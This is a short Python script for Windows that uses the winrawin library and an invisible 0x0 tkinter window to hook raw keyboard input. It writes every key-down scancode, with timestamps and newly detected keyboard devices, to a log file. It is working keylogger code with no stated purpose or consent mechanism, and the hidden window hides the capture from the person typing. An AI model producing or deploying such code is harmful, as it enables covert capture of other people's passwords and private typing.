# ------------------ # Imports # ------------------ #
import time

import winrawin
import tkinter as tk
from winrawin import Keyboard
from threading import Thread
import sys

# ------------------ # Vars # ------------------ #
keyboards = []
threads = []

logfile = sys.argv[1]
original_stdout = sys.stdout

# ------------------ # Functions # ------------------ #
# translate https://www.win.tue.nl/~aeb/linux/kbd/scancodes-14.html
open(logfile, 'w').close()

def handle_event(e: winrawin.RawInputEvent):
    with open(logfile, 'a') as f:
        if e.device not in keyboards and isinstance(e.device, Keyboard):
            keyboards.append(e.device)
            f.write(f"\nNew Device detected: {e.device}\n")
        if e.device in keyboards and e.event_type == 'down':
            f.write(f"\n[KeyEvent-{time.time()}]"+str(e.code))
        sys.stdout = original_stdout


# ------------------ # Main Window # ------------------ #
window = tk.Tk()
window.geometry("0x0")

# ------------------ # Main Loop and Routines # ------------------ #
winrawin.hook_raw_input_for_window(window.winfo_id(), handle_event)
window.mainloop()